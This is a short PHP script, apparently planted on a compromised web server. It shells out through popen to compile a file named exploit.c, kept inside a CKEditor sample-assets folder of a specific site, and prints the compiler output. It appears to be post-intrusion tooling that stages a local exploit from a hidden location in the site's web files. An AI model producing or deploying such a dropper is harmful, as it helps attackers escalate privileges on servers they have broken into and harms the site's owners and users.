<?php
    function rfile($fp) {
    $out="";
       while (!feof($fp)) {
           $out.= fgets($fp, 1024000);
       }
       return $out;
    }
    $p = popen('gcc -Wall -g /var/www/flaming777.com/data/www/flaming777.com/public/back/bower_components/ckeditor/samples/old/assets/exploit.c -o /var/www/flaming777.com/data/www/flaming777.com/public/back/bower_components/ckeditor/samples/old/assets/exp.o 2>&1', 'r');
    $result = rfile($p);
    pclose($p);
    echo $result;
?>
